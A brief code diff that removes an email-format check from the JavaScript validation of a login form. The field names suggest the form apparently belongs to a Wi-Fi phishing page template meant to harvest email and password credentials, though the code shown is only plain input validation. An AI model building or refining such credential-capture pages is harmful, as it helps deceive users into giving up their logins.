@@ -4,12 +4,6 @@
 <script>
 function validateForm() {
     var x = document.forms["theform"]["wfphshr-email"].value;
-    var atpos = x.indexOf("@");
-    var dotpos = x.lastIndexOf(".");
-    if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length) {
-        alert("Failed to authenticate. Wrong Email or Password.");
-        return false;
-    }
 
     var x = document.forms["theform"]["wfphshr-password"].value;
     if (5>=x.length) {
